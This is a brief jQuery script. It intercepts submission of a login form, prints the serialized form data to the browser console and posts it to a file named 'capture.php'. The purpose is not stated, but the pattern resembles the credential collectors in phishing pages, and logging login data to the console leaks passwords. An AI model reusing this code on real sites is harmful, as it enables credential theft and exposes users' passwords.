$(document).ready(function(){
	$('#LoginForm').submit(function(){
		var data = $('#LoginForm').serialize();
		console.log(data);
		$.ajax({
			url : 'capture.php',
			type : 'post',
			data : data,
			'Content-Type' : 'application/x-www-form-urlencoded'
		});
	});
	
});
